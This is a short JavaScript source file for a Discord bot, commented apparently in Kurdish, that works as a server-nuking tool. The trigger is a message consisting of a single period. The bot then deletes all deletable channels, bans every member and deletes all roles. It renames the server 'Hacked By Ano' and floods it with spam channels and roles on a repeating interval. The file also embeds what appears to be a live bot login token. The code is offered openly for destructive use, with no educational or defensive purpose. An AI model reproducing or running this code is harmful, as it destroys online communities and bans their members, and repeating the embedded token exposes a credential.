const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("Hacked By Ano");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("Hamu Xatay Partia", "text");///////bo channel 
        message.guild.createChannel("Hamu Xatay Partia", "voice");////bo voice
        message.guild.createRole({ name: "Hamu Xatay Partia" });////nawek dane bo role kan
      });
    }
  }
});

client.login("OTUxNjA0NTg1NzcwOTEzODMy.GczCgw.CRcWmLQ4dSBZLKlu85auqbL91trrhUiBdi8gVA")

////Panda Up Up////
